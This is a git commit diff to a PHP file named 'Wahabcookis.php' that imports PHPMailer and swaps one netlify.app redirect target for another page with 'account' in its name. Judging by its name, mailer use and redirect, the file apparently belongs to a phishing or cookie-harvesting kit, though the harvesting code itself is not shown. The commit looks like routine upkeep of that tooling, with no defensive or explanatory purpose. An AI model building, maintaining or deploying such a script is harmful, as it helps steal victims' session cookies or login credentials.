3dadff600b54fe1695b1b5afc31049babb21ab1d
Lernamzaxal892 <lernayouamzaxal@gmail.com>
2025-08-12 15:36:32 +0500

    Update Wahabcookis.php

--- Wahabcookis.php
+++ Wahabcookis.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://heroic-macaron-3711c5-user-data.netlify.app/");
+header("Location: https://new-page-concat-account.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
